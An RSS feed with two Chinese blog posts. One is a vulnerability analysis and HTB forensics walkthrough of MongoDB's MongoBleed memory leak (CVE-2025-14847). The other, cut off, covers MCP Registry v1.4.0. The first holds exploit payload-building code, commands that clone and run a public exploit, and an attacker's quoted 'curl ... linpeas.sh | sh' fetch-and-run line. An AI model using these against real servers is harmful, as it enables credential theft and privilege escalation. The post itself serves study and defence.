{
  "title": "主页 - 博客园",
  "link": "https://www.cnblogs.com/",
  "description": "主页 - 博客园 RSS",
  "entries": [
    {
      "title": "深度分析MangoBleed(CVE-2025-14847)",
      "link": "https://www.cnblogs.com/DSchenzi/p/19434377",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/DSchenzi/p/19434377\" id=\"cb_post_title_url\" title=\"发布于 2026-01-03 15:22\">\n    <span>深度分析MangoBleed(CVE-2025-14847)</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<h1 id=\"mangobleedcve-2025-14847\">MangoBleed(CVE-2025-14847)</h1>\n<p>本文分析了CVE-2025-14847漏洞原理、漏洞复现以及结合了HTB靶场的Sherlock进行综合分析日志。</p>\n<h2 id=\"sherlock-scenario\">Sherlock Scenario</h2>\n<p>You were contacted early this morning to handle a high‑priority incident involving a suspected compromised server. The host, mongodbsync, is a secondary MongoDB server. According to the administrator, it's maintained once a month, and they recently became aware of a vulnerability referred to as MongoBleed. As a precaution, the administrator has provided you with root-level access to facilitate your investigation.</p>\n<p>You have already collected a triage acquisition from the server using UAC. Perform a rapid triage analysis of the collected artifacts to determine whether the system has been compromised, identify any attacker activity (initial access, persistence, privilege escalation, lateral movement, or data access/exfiltration), and summarize your findings with an initial incident assessment and recommended next steps.</p>\n<h2 id=\"task1\">Task1</h2>\n<p>What is the CVE ID designated to the MongoDB vulnerability explained in the scenario?</p>\n<p>网上搜一下也就是最近爆出来的</p>\n<p><strong>CVE-2025-14847</strong></p>\n<h3 id=\"漏洞简介\">漏洞简介</h3>\n<ul>\n<li>\n<p>类型：无认证远程堆内存泄露</p>\n</li>\n<li>\n<p>危害：攻击者无需认证即可从服务器内存中提取敏感数据，可能包括数据库凭证、API密钥、会话令牌、用户数据等</p>\n</li>\n</ul>\n<h3 id=\"漏洞原理\">漏洞原理</h3>\n<p>根源在于MongoDB的zlib网络消息压缩处理逻辑：</p>\n<ul>\n<li>MongoDB支持客户端发送压缩消息。</li>\n<li>攻击者发送特质畸形的压缩包，在消息头中故意制造长度字段不一致</li>\n<li>服务器在解压时会分配过大缓冲区，并错误地将未初始化地堆内存作为有效数据返回给攻击者。</li>\n<li>此过程多次发送不同偏移的畸形请求，攻击者可逐步提取内存碎片，聚合后可能恢复敏感信息。</li>\n<li>不是直接RCE，但泄露的凭证可导致后续横向移动或数据窃取。</li>\n</ul>\n<h3 id=\"受影响版本\">受影响版本</h3>\n<p>几乎所有2017年以来启用zlib压缩的MongoDB Server版本，包括主流分支:</p>\n<ul>\n<li>8.x系列（至8.2.2）</li>\n<li>7.0.x、6.0.x、5.0.x、4.4.x等遗留版本</li>\n<li>具体：影响4.4、5.0、6.0、7.0、8.0全系列（直到2025年11月版本）</li>\n</ul>\n<h3 id=\"环境搭建\">环境搭建</h3>\n<p>1.docker环境</p>\n<p>docker-compose.yml</p>\n<pre><code class=\"language-yml\">version: '3.8'\n\nservices:\n  # 受漏洞影响的版本（开启 Zlib）\n  mongodb-vulnerable:\n    image: mongo:6.0.14\n    container_name: mongodb-vulnerable\n    ports:\n      - \"27017:27017\"\n    command: mongod --networkMessageCompressors snappy,zlib\n\n  # 已修复的版本（用于对比测试）\n  mongodb-patched:\n    image: mongo:6.0.27\n    container_name: mongodb-patched\n    ports:\n      - \"27018:27017\"\n    command: mongod --networkMessageCompressors snappy,zlib\n\nvolumes:\n  mongodb-data:\n  mongodb-patched-data:\n</code></pre>\n<p>拉取镜像</p>\n<pre><code class=\"language-kotlin\">docker-compose up -d\n</code></pre>\n<p>拉取失败的可以使用这个仓库的镜像源配置工具:</p>\n<pre><code class=\"language-kotlin\">git clone https://github.com/hzhsec/docker_proxy.git\nchmod +x *.sh\n./docker-proxy.sh\n</code></pre>\n<p>等镜像源换完，再拉取</p>\n<pre><code>docker-compose up -d\n</code></pre>\n<p><img alt=\"image-20260101223837974\" src=\"https://img2024.cnblogs.com/blog/3588329/202601/3588329-20260103152112091-633231826.png\" /></p>\n<h3 id=\"漏洞复现\">漏洞复现</h3>\n<pre><code class=\"language-kotlin\">git clone https://github.com/cybertechajju/CVE-2025-14847_Expolit.git\ncd CVE-2025-14847_Expolit\n</code></pre>\n<p>创建虚拟环境</p>\n<pre><code class=\"language-kotlin\">python -m venv myenv\nsource myenv/bin/activate\n</code></pre>\n<p>安装依赖包</p>\n<pre><code class=\"language-kotlin\">pip install -r requirements.txt\npython mongobleed_pro.py -h\n</code></pre>\n<p><img alt=\"image-20260101225522114\" src=\"https://img2024.cnblogs.com/blog/3588329/202601/3588329-20260103152112673-1527423820.png\" /></p>\n<p>使用本地的27017漏洞版本测试</p>\n<pre><code>python mongobleed_pro.py --target http://localhost:27017\n</code></pre>\n<p><img alt=\"image-20260101230632647\" src=\"https://img2024.cnblogs.com/blog/3588329/202601/3588329-20260103152113009-2057906935.png\" /></p>\n<p>泄露了数据，保存在本地的<code>dump_localhost.bin</code>，<code>loot_localhost.txt</code></p>\n<p>同时测试一下<code>27018</code>端口</p>\n<p><img alt=\"image-20260101230957937\" src=\"https://img2024.cnblogs.com/blog/3588329/202601/3588329-20260103152113400-1983221027.png\" /></p>\n<p>没有漏洞</p>\n<h3 id=\"漏洞分析\">漏洞分析</h3>\n<p>我们从exp上去分析一下</p>\n<p>第一步：</p>\n<pre><code class=\"language-python\">sock = socket.socket()\nsock.settimeout(3)\nsock.connect((host, port))  # 尝试连接MongoDB默认端口27017\n</code></pre>\n<p>第二步：</p>\n<p><code>check_vulnerability()</code>漏洞存在性检测</p>\n<pre><code class=\"language-python\">def check_vulnerability(host, port):\n    hacker_loading(\"Probing target defenses\", 1)\n    test_offsets = [100, 500, 1000, 1500, 2000, 3000]\n    for offset in test_offsets:\n        response = send_probe(host, port, offset, offset + 500)\n        if extract_leaks(response):\n            return True\n    return False\n</code></pre>\n<p>通过不同的\"偏移量（offset）\"发送请求，只要能从响应中提取到非预期数据，就判定目标漏洞未修复。</p>\n<p>第三步：</p>\n<p><code>send_probe()</code>构造payload</p>\n<pre><code class=\"language-python\"># 1. 构造畸形的BSON文档（MongoDB的数据格式）\ncontent = b'\\x10a\\x00\\x01\\x00\\x00\\x00'\nbson = struct.pack('&lt;i', doc_len) + content  # 伪造文档长度（关键漏洞触发点）\n\n# 2. 封装为MongoDB的OP_MSG消息\nop_msg = struct.pack('&lt;I', 0) + b'\\x00' + bson\n\n# 3. 压缩消息（触发漏洞的关键操作）\ncompressed = zlib.compress(op_msg)\n\n# 4. 构造最终恶意载荷（包含压缩标识+畸形数据）\npayload = struct.pack('&lt;I', 2013) + struct.pack('&lt;i', buffer_size) + struct.pack('B', 2) + compressed\n\n# 5. 加上MongoDB协议头，发送给目标\nheader = struct.pack('&lt;IIII', 16 + len(payload), 1, 0, 2012)\nsock.sendall(header + payload)\n</code></pre>\n<ol>\n<li>伪造的BSON文档长度(doc_len)与实际内容不匹配</li>\n<li>对请求进行zlib压缩后，MongoDB的解压/解析逻辑存在缺陷，导致内存越界读取</li>\n<li>攻击者通过控制doc_len和buffer_size（缓冲区大小），精准控制内存读取的范围</li>\n</ol>\n<p>第四步：</p>\n<p>发送请求并接收泄露数据（send_probe()后续逻辑）</p>\n<pre><code class=\"language-python\">response = b''\nwhile len(response) &lt; 4 or len(response) &lt; struct.unpack('&lt;I', response[:4])[0]:\n    chunk = sock.recv(4096) #持续接受响应（直到完整读取）\n    if not chunk: break\n    response += chunk\n</code></pre>\n<p>获取目标返回的、包含内存泄漏数据的响应包</p>\n<p>第五步：</p>\n<p>提取泄露的内存数据即 extract_leaks函数</p>\n<p>批量提取+敏感信息识别<code>run_exploit()</code> + <code>analyze_secrets()</code></p>\n<p>还有保存攻击结果（持久化loot）</p>\n<p>攻击总结：</p>\n<p><img alt=\"image-20260102153604895\" src=\"https://img2024.cnblogs.com/blog/3588329/202601/3588329-20260103152113901-643757865.png\" /></p>\n<p>回到源码</p>\n<p><a href=\"https://github.com/mongodb/mongo/blob/r8.0.16/src/mongo/transport/message_compressor_zlib.cpp\" rel=\"noopener nofollow\" target=\"_blank\">https://github.com/mongodb/mongo/blob/r8.0.16/src/mongo/transport/message_compressor_zlib.cpp</a></p>\n<p><img alt=\"image-20260102154747986\" src=\"https://img2024.cnblogs.com/blog/3588329/202601/3588329-20260103152114375-627847864.png\" /></p>\n<p>原本用于返回解压数据大小的行使用了<code>return {output.length()};</code>这行代码，它告诉代码返回已分配的内存量，而不是解压数据的实际长度。新的<code>return {length};</code>确保只返回解压缩数据的实际长度。</p>\n<p><a href=\"https://github.com/mongodb/mongo/blob/master/src/mongo/transport/message_compressor_zlib.cpp\" rel=\"noopener nofollow\" target=\"_blank\">https://github.com/mongodb/mongo/blob/master/src/mongo/transport/message_compressor_zlib.cpp</a></p>\n<p><img alt=\"image-20260102155010199\" src=\"https://img2024.cnblogs.com/blog/3588329/202601/3588329-20260103152114721-1137957807.png\" /></p>\n<p>进一步分析可以发现，在新的<code>src/mongo/transport/message_compressor_manager_test.cpp</code>中多了一个checkUndersize函数</p>\n<pre><code class=\"language-cpp\">void checkUndersize(const Message&amp; compressedMsg,\n                    std::unique_ptr&lt;MessageCompressorBase&gt; compressor) {\n    MessageCompressorRegistry registry;\n    const auto compressorName = compressor-&gt;getName();\n\n    std::vector&lt;std::string&gt; compressorList = {compressorName};\n    registry.setSupportedCompressors(std::move(compressorList));\n    registry.registerImplementation(std::move(compressor));\n    registry.finalizeSupportedCompressors().transitional_ignore();\n\n    MessageCompressorManager mgr(&amp;registry);\n    BSONObjBuilder negotiatorOut;\n    std::vector&lt;StringData&gt; negotiator({compressorName});\n    mgr.serverNegotiate(negotiator, &amp;negotiatorOut);\n    checkNegotiationResult(negotiatorOut.done(), {compressorName});\n\n    auto swm = mgr.decompressMessage(compressedMsg);\n    ASSERT_EQ(ErrorCodes::BadValue, swm.getStatus());\n}\n</code></pre>\n<p>核心逻辑在</p>\n<p><img alt=\"image-20260102155616512\" src=\"https://img2024.cnblogs.com/blog/3588329/202601/3588329-20260103152115003-534946274.png\" /></p>\n<p><code>mgr.decompressMessage(compressedMsg)</code>:调用压缩器管理器解压传入的“异常”的压缩消息</p>\n<p><code>ASSERT_EQ(ErrorCodes::BadValue, swm.getStatus())</code>：单元测试断言</p>\n<p>主要目的是验证当传入一个 “尺寸异常（undersize）” 的压缩消息时，消息解压逻辑能正确返回 <code>ErrorCodes::BadValue</code> 错误码</p>\n<p>同时在下面也给到了测试用例</p>\n<p><img alt=\"image-20260102155917477\" src=\"https://img2024.cnblogs.com/blog/3588329/202601/3588329-20260103152115354-1662843965.png\" /></p>\n<p>重点看一下Zlib的测试用例</p>\n<pre><code class=\"language-cpp\">TEST(ZlibMessageCompressor, Undersize) {\n    // 1. 构造Zlib算法的“尺寸异常”二进制消息数据\n    std::vector&lt;std::uint8_t&gt; payload = {\n        0x3c, 0x00, 0x00, 0x00, 0xad, 0xde, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xdc, 0x07, 0x00,\n        0x00, 0xdd, 0x07, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x02, 0x78, 0xda, 0x63, 0x60, 0x00,\n        0x82, 0xdf, 0xf2, 0x0c, 0x0c, 0xac, 0xf1, 0x99, 0x29, 0x0c, 0x0c, 0x02, 0x40, 0x9e, 0x87,\n        0xab, 0x63, 0x80, 0x8f, 0xab, 0xa3, 0x37, 0x03, 0x12, 0x00, 0x00, 0x6d, 0x26, 0x04, 0x97};\n\n    // 2. 分配缓冲区并拷贝数据\n    auto buffer = SharedBuffer::allocate(payload.size());\n    std::copy(payload.begin(), payload.end(), buffer.get());\n\n    // 3. 调用测试函数：传入异常消息 + Zlib压缩器实例\n    checkUndersize(Message(buffer), std::make_unique&lt;ZlibMessageCompressor&gt;());\n}\n</code></pre>\n<table>\n<thead>\n<tr>\n<th>字节范围</th>\n<th>含义</th>\n<th>对应 payload 值</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>0-3</td>\n<td>消息总长度（小端序 uint32）</td>\n<td>0x3c 0x00 0x00 0x00</td>\n<td>解析为十进制 60 → 声明消息总长度是 60 字节</td>\n</tr>\n<tr>\n<td>4-7</td>\n<td>魔数 / 标识</td>\n<td>0xad 0xde 0x00 0x00</td>\n<td>MongoDB 自定义的压缩消息标识（0xADDE 是固定值）</td>\n</tr>\n<tr>\n<td>8-11</td>\n<td>保留字段</td>\n<td>0x00 0x00 0x00 0x00</td>\n<td>无实际意义，占位</td>\n</tr>\n<tr>\n<td>12-15</td>\n<td>压缩器类型（小端序 uint32）</td>\n<td>0xdc 0x07 0x00 0x00</td>\n<td>解析为十进制 2012 → 标识这是 Zlib 压缩的数据（不同压缩器有专属数值）</td>\n</tr>\n<tr>\n<td>16-19</td>\n<td>保留字段</td>\n<td>0xdd 0x07 0x00 0x00</td>\n<td>占位</td>\n</tr>\n<tr>\n<td>20-23</td>\n<td>原始数据长度（小端序 uint32）</td>\n<td>0x00 0x20 0x00 0x00</td>\n<td>解析为十进制 8192 → 声明解压后原始数据长度是 8192 字节</td>\n</tr>\n<tr>\n<td>24</td>\n<td>压缩算法标识</td>\n<td>0x02</td>\n<td>Zlib 的算法标识（Snappy 是 0x01，Zstd 是 0x03）</td>\n</tr>\n<tr>\n<td>25+</td>\n<td>Zlib 压缩数据体</td>\n<td>0x78 0xda ... 0x04 0x97</td>\n<td>Zlib 格式的压缩数据（但被故意构造为 “尺寸不足”）</td>\n</tr>\n</tbody>\n</table>\n<ul>\n<li>头部声明 “原始数据长度是 8192 字节”，但实际的 Zlib 压缩数据体只有 <code>60-25=35</code> 字节 → 远不足以解压出 8192 字节的原始数据，解压逻辑会检测到 “数据尺寸不足”。</li>\n</ul>\n<p><img alt=\"image-20260102160356664\" src=\"https://img2024.cnblogs.com/blog/3588329/202601/3588329-20260103152115814-318572431.png\" /></p>\n<h3 id=\"漏洞修复\">漏洞修复</h3>\n<p>1.立即升级到<strong>已修复版本</strong>：</p>\n<p>立即升级到：</p>\n<ul>\n<li>8.2.3、8.0.17、7.0.28、6.0.27、5.0.32、4.4.30</li>\n<li>MongoDB Atlas（托管版）已自动修复。</li>\n</ul>\n<p>2.<strong>临时缓解</strong>：<br />\n禁用 <code>zlib</code> 压缩<br />\n（启动参数：<code>--networkMessageCompressors=snappy,zstd</code> 或配置文件中排除 zlib）<br />\n不要将27017端口暴露在互联网<br />\n数据库访问设置白名单,不要设置任何ip可访问</p>\n<h2 id=\"task2\">Task2</h2>\n<p>What is the version of MongoDB installed on the server that the CVE exploited?</p>\n<p>分析位于<code>MangoBleed\\uac-mongodbsync-linux-triage\\[root]\\var\\log\\mongodb\\mongod.log</code></p>\n<p><img alt=\"image-20260102161150999\" src=\"https://img2024.cnblogs.com/blog/3588329/202601/3588329-20260103152116177-1760271411.png\" /></p>\n<p>8.0.16</p>\n<h2 id=\"task3\">Task3</h2>\n<p>Analyze the MongoDB logs to identify the attacker’s remote IP address used to exploit the CVE.</p>\n<p>在日志中关注事件ID22943(连接)和ID22944(断开连接)</p>\n<p>65.0.76.43</p>\n<p>我们也可以用工具进行分析</p>\n<p><a href=\"https://github.com/Neo23x0/mongobleed-detector\" rel=\"noopener nofollow\" target=\"_blank\">https://github.com/Neo23x0/mongobleed-detector</a></p>\n<pre><code class=\"language-kotlin\"># Shell script dependencies\n# Debian/Ubuntu\napt-get install jq gawk gzip\n\n# RHEL/CentOS/Fedora\ndnf install jq gawk gzip\n\n# macOS\nbrew install jq gawk\n\n# Python remote scanner has no additional dependencies\n# Uses native ssh/scp commands\n\n\n# Clone the repository\ngit clone https://github.com/your-org/mongobleed-detector.git\ncd mongobleed-detector\n\n# Make executable\nchmod +x mongobleed-detector.sh\n</code></pre>\n<pre><code class=\"language-kotlin\">./mongobleed-detector.sh --no-default-paths -p ./mongod.log -t 10000\n</code></pre>\n<p><img alt=\"image-20260102164314888\" src=\"https://img2024.cnblogs.com/blog/3588329/202601/3588329-20260103152116518-329116859.png\" /></p>\n<h2 id=\"task4\">Task4</h2>\n<p>Based on the MongoDB logs, determine the exact date and time the attacker’s exploitation activity began (the earliest confirmed malicious event)</p>\n<p><img alt=\"image-20260102164437061\" src=\"https://img2024.cnblogs.com/blog/3588329/202601/3588329-20260103152116838-1010417894.png\" /></p>\n<p>根据上图可以看到</p>\n<p>2025-12-29 05:25:52</p>\n<h2 id=\"task5\">Task5</h2>\n<p>Using the MongoDB logs, calculate the total number of malicious connections initiated by the attacker.</p>\n<p>同样在上图</p>\n<p><img alt=\"image-20260102165143240\" src=\"https://img2024.cnblogs.com/blog/3588329/202601/3588329-20260103152117142-1389182106.png\" /></p>\n<ul>\n<li><strong>Risk</strong>：风险等级（这里是<code>HIGH</code>，表示高风险）</li>\n<li><strong>SourceIP</strong>：来源 IP 地址（这里是<code>65.0.76.43</code>）</li>\n<li><strong>ConnCount</strong>：连接次数（37630 次，短时间内大量连接）</li>\n<li><strong>MetaCount</strong>：元数据操作次数（0 次）</li>\n<li><strong>DiscCount</strong>：断开连接次数（37630 次，和连接数一致，说明连接后立即断开）</li>\n<li><strong>MetaRate%</strong>：元数据操作占比（0.00%）</li>\n<li><strong>BurstRate/m</strong>：每分钟爆发连接数（30104 次，短时间内连接频率极高）</li>\n<li><strong>First/LastSeen</strong>：首次 / 最后一次出现的时间（2025-12-29 的 2 分钟内完成了大量连接）</li>\n</ul>\n<p>所以总共为75260</p>\n<p>75260</p>\n<h2 id=\"task6\">Task6</h2>\n<p>The attacker gained remote access after a series of brute‑force attempts. The attack likely exposed sensitive information, which enabled them to gain remote access. Based on the logs, when did the attacker successfully gain interactive hands-on remote access?</p>\n<p>访问/var/log/auth.log日志</p>\n<p><img alt=\"image-20260102171320748\" src=\"https://img2024.cnblogs.com/blog/3588329/202601/3588329-20260103152117520-781480417.png\" /></p>\n<p>2025-12-29 05:40:03</p>\n<h2 id=\"task7\">Task7</h2>\n<p>Identify the exact command line the attacker used to execute an in‑memory script as part of their privilege‑escalation attempt.</p>\n<p><img alt=\"image-20260102172751711\" src=\"https://img2024.cnblogs.com/blog/3588329/202601/3588329-20260103152117901-872419183.png\" /></p>\n<p>确定用户为mongoadmin</p>\n<p><code>uac-mongodbsync-linux-triage\\[root]\\home\\mongoadmin</code>下的.bash_history文件中</p>\n<p><img alt=\"image-20260102172905804\" src=\"https://img2024.cnblogs.com/blog/3588329/202601/3588329-20260103152118284-543519413.png\" /></p>\n<p><code>curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh</code></p>\n<h2 id=\"task8\">Task8</h2>\n<p>The attacker was interested in a specific directory and also opened a Python web server, likely for exfiltration purposes. Which directory was the target?</p>\n<p><img alt=\"image-20260102173145834\" src=\"https://img2024.cnblogs.com/blog/3588329/202601/3588329-20260103152118612-1268812667.png\" /></p>\n<p>同样去分析一下</p>\n<p>/var/lib/mongodb</p>\n<p><img alt=\"image-20260102173140081\" src=\"https://img2024.cnblogs.com/blog/3588329/202601/3588329-20260103152119029-1224398251.png\" /></p>\n<p>文章借鉴：</p>\n<p><a href=\"https://www.cnblogs.com/hzhsec/p/19428472\" target=\"_blank\">https://www.cnblogs.com/hzhsec/p/19428472</a></p>\n<p><a href=\"https://www.gm7.org/archives/16179\" rel=\"noopener nofollow\" target=\"_blank\">https://www.gm7.org/archives/16179</a></p>\n<p><strong>免责声明</strong></p>\n<p>本文档<code>MongoDB漏洞复现（CVE-2025-14847）</code>所包含的漏洞复现方法、技术细节及利用代码，<strong>仅限用于授权的安全测试、教育学习与研究目的</strong>。</p>\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-01-03 15:22</span>&nbsp;\n<a href=\"https://www.cnblogs.com/DSchenzi\">dynasty_chenzi</a>&nbsp;\n阅读(<span id=\"post_view_count\">4</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "MCP Registry v1.4.0 最新进展",
      "link": "https://www.cnblogs.com/shanyou/p/19432926",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/shanyou/p/19432926\" id=\"cb_post_title_url\" title=\"发布于 2026-01-02 22:34\">\n    <span>MCP Registry v1.4.0 最新进展</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body blogpost-body-html\" id=\"cnblogs_post_body\">\n<p><font face=\"微软雅黑 Light\" size=\"3\">2025 年 12 月 16 日发布的 Registry v1.4.0 版本 ，不仅是技术规格的一次迭代，更是整个协议迈向成熟的重要里程碑。该版本引入了严格的 2025-12-11 模式定义 ，正式确立了对 streamable-http 传输层的原生支持，并重构了发布者验证流程。与此同时，MCP 的治理结构发生了历史性变革——Anthropic 将该协议捐赠给 Linux 基金会旗下新成立的 Agentic AI 基金会 (AAIF)。这一举措有效地消除了企业采用该协议的供应商锁定顾虑，促成了包括 AWS、Google Cloud、Cisco 和 Microsoft 在内的行业巨头对该标准的全面拥抱。</font></p><p><font face=\"微软雅黑 Light\" size=\"3\">要理解 v1.4.0 版本的技术意义，必须首先审视 MCP 旨在解决的核心架构挑战。在 MCP 出现之前，将 LLM 连接到外部数据源（如 PostgreSQL 数据库、GitHub 仓库或 Notion 文档）需要针对每个模型提供商编写定制的集成代码。</font></p><p><font face=\"微软雅黑 Light\" size=\"3\">在前 MCP 时代，开发者面临着所谓的“N x M”集成困境。假设有 N 个主流 AI 模型（如 Claude 3.5, GPT-4o, Gemini 1.5）和 M 个外部工具或数据源。若要实现互操作性，理论上需要维护 N * M 个独立的连接器。这种架构不仅脆弱，而且极难扩展。一旦数据源的 API 发生变更，或者开发者决定切换 AI 模型，所有的集成工作都需要推倒重来 。</font></p><p><font face=\"微软雅黑 Light\" size=\"3\">MCP 通过引入标准化的中间层，将这一复杂度降低为 N + M。</font></p><ul><li><p><font face=\"微软雅黑 Light\" size=\"3\">标准化接口： MCP 定义了一套通用的 JSON-RPC 2.0 消息格式，使得任何兼容 MCP 的主机（Host）都可以直接与任何 MCP 服务器（Server）通信，而无需了解后者的底层实现细节。</font></p></li><li><p><font face=\"微软雅黑 Light\" size=\"3\"><font face=\"微软雅黑 Light\" size=\"3\">通用连接器： 这意味着一个针对 Google Drive 开发的 MCP 服务器，可以同时被 Claude Desktop、Cursor IDE、VS Code 甚至定制的企业 AI 代理所使用，真正实现了“一次编写，到处运行”的愿景。</font></font></p></li></ul><p><font face=\"微软雅黑 Light\" size=\"3\">随着 v1.4.0 的发布，MCP 的组件体系已高度成熟，形成了清晰的四层架构：</font></p><ol><li><p><font face=\"微软雅黑 Light\" size=\"3\">MCP Host（主机）：<br />这是 AI 模型的运行环境，也是集成的发起端。典型的主机包括 Claude Desktop、Cursor、Windsurf 以及各类企业级 AI 网关。主机负责管理与用户的交互上下文，并将用户的自然语言意图转化为对 MCP 工具的调用请求 。</font></p></li><li><p><font face=\"微软雅黑 Light\" size=\"3\">MCP Client（客户端）：<br />嵌入在主机内部的协议实现层。它负责与服务器建立 1:1 的连接，处理协议握手、能力协商（Capabilities Negotiation）以及消息的序列化与反序列化。在 v1.4.0 生态中，客户端承担了更多安全职责，如 OAuth 2.0 令牌管理和权限范围（Scope）控制 。</font></p></li><li><p><font face=\"微软雅黑 Light\" size=\"3\">MCP Server（服务器）：<br />这是生态系统的核心资产。服务器是一个轻量级的网关程序，它封装了特定的数据源或工具，并通过 MCP 协议暴露给外界。服务器可以极其简单（如一个只读的 SQLite 查询器），也可以极其复杂（如一个具有推理能力的 GitHub 运维代理）。v1.4.0 版本极大地增强了服务器的元数据定义能力，使其能够更精准地向注册表描述自身行为。</font></p></li><li><p><font face=\"微软雅黑 Light\" size=\"3\">Transport Layer（传输层）：<br />通信的管道。</font></p></li></ol><ul><ul><li><p><font face=\"微软雅黑 Light\" size=\"3\">Stdio（标准输入输出）： 在 MCP 早期主要用于本地开发，通过进程间通信（IPC）实现极其低延迟的交互，且天然隔离网络风险。</font></p></li><li><p><font face=\"微软雅黑 Light\" size=\"3\">SSE (Server-Sent Events) over HTTP: 随着 v1.4.0 对远程连接支持的完善，基于 HTTP 的 SSE 传输已成为主流。它允许服务器独立部署在云端（如 Docker 容器或 Serverless 函数中），并通过标准 URL 被远程客户端访问。这种模式是企业级“远程 MCP”部署的基石。</font></p></li></ul></ul><p><font face=\"微软雅黑 Light\" size=\"3\">&nbsp;&nbsp;&nbsp;&nbsp; 2025 年 12 月 16 日，modelcontextprotocol/registry 仓库发布了 v1.4.0 版本。这一版本不仅仅是代码的更新，更是对整个注册表服务（Registry Service）数据模型的一次重构，旨在适应日益复杂的分布式生态系统。</font></p><p><br /></p><p><font face=\"微软雅黑 Light\" size=\"3\">v1.4.0 最具破坏性但也最具建设性的变更是强制采用了新的 server.json 模式定义，版本号为 2025-12-11。server.json 文件是 MCP 服务器在注册表中的“身份证”，它定义了服务器的名称、描述、安装方式及版本信息。</font></p><p><font face=\"微软雅黑 Light\" size=\"3\">在此之前的版本（如 2025-10-17）中，模式定义相对宽松，允许许多非标准字段存在，且对远程连接的定义不够严谨。新的模式带来了以下关键改进：</font></p><h6><font face=\"微软雅黑 Light\" size=\"3\" style=\"font-weight: normal;\">1 、严格的传输层定义：<font face=\"微软雅黑 Light\" size=\"3\">新模式显式地标准化了 remotes 字段中 streamable-http 的配置方式。<font face=\"微软雅黑 Light\" size=\"3\">在旧版本中，远程服务器的配置往往依赖于特定客户端的约定俗成。而在 v1.4.0 中，server.json 必须严格遵循以下结构来声明远程能力 。<font face=\"微软雅黑 Light\" size=\"3\">这种严格的类型定义（Type Safety）确保了无论是 VS Code 还是 Claude Desktop，在解析远程服务器时都能准确识别连接方式和认证需求，消除了因配置模糊导致的连接失败。</font></font></font></font></h6><h6><font face=\"微软雅黑 Light\" size=\"3\" style=\"font-weight: normal;\">2 、移除 status 字段与动态健康检查：<font face=\"微软雅黑 Light\" size=\"3\">v1.4.0 移除了 server.json 中的 status 字段 。此前，开发者需要手动在 JSON 文件中标记服务器状态（如 \"beta\", \"stable\"）。这种静态标记往往与实际运行状态脱节。<font face=\"微软雅黑 Light\" size=\"3\">新版本的设计理念是：健康状态应当是动态监测的结果，而非静态声明。 注册表服务现在通过内置的验证逻辑（Validation Logic）定期轮询服务器，根据实际响应情况决定其在索引中的可见性。这显著提高了注册表数据的可信度，防止用户安装已停摆的“僵尸服务器”。</font></font></font></h6><h6><font face=\"微软雅黑 Light\" size=\"3\" style=\"font-weight: normal;\">3、 版本一致性强制：<font face=\"微软雅黑 Light\" size=\"3\">新模式引入了严格的版本一致性检查。server.json 中的 version 字段现在必须与 Git Tag 或包管理器（NPM/PyPI）中的版本号严格匹配 。如果注册表检测到版本号不一致（例如 server.json 声明了 v2.0.0 但 Git Tag 只有 v1.9.0），发布流程将自动失败。这一机制有效地杜绝了“幽灵版本”问题，确保用户拉取的代码与注册表描述完全一致。</font></font></h6><p><font face=\"微软雅黑 Light\" size=\"3\">伴随注册表更新，官方发布工具 mcp-publisher 也同步升级至 v1.4.0 17。该 CLI 工具是开发者与 MCP 注册表交互的主要接口。</font> </p><p><font face=\"微软雅黑 Light\" size=\"3\">v1.4.0 版本的发布器深度集成了 OpenID Connect (OIDC) 协议，特别是针对 GitHub Actions 的环境。这意味着开发者不再需要生成和维护长效的 API 密钥（Long-lived Secrets）来发布更新。</font></p><p><font face=\"微软雅黑 Light\" size=\"3\">通过配置 GitHub Action Workflow，mcp-publisher 可以利用临时的 OIDC 令牌向注册表证明身份。注册表服务端会验证该令牌是否由合法的 GitHub 仓库签发，从而授权发布。这极大地提升了供应链的安全性，因为即便发布脚本泄露，攻击者也无法在外部环境伪造有效的 OIDC 令牌 。</font></p><h6><font face=\"微软雅黑 Light\" size=\"3\">新版工具引入了更强大的 check 和 init 命令。</font></h6><ul><li><p><font face=\"微软雅黑 Light\" size=\"3\">mcp-publisher init：能够智能分析当前目录结构（识别是 Node.js 项目还是 Python 项目），自动生成符合 2025-12-11 标准的 server.json 模板。</font></p></li><li><p><font face=\"微软雅黑 Light\" size=\"3\">mcp-publisher check（或集成在发布流程中的验证）：在上传前对 JSON 文件进行本地 Schema 校验。这解决了以往提交后才发现格式错误导致发布失败的痛点，缩短了反馈循环</font> 。</p></li></ul><p><font face=\"微软雅黑 Light\" size=\"3\"><br /></font></p><p><font face=\"微软雅黑 Light\" size=\"3\">如果说 Registry v1.4.0 是技术的升级，那么 Agentic AI 基金会 (AAIF) 的成立则是 MCP 走向行业标准的政治宣言。2025 年 12 月 9 日，Anthropic 正式宣布将 MCP 项目及其相关资产捐赠给 Linux 基金会旗下新成立的 AAIF。</font></p><p><font face=\"微软雅黑 Light\" size=\"3\">在 2024 年至 2025 年间，AI 领域被视为各大巨头（OpenAI, Google, Anthropic, Meta）争夺生态主导权的战场。如果 MCP 始终由 Anthropic 一家公司控制，其他竞争对手（尤其是 OpenAI 和 Google）将很难毫无保留地采纳这一标准，因为这涉及到生态锁定的风险。</font></p><p><font face=\"微软雅黑 Light\" size=\"3\"><font face=\"微软雅黑 Light\" size=\"3\">通过将 MCP 移交给 Linux 基金会这一中立机构，Anthropic 效仿了 Google 捐赠 Kubernetes 给 CNCF 的成功路径。这一举措产生了立竿见影的效果：</font></font></p><ul><li><p><font face=\"微软雅黑 Light\" size=\"3\">消除信任障碍： AWS 和 Google Cloud 随即宣布加强对 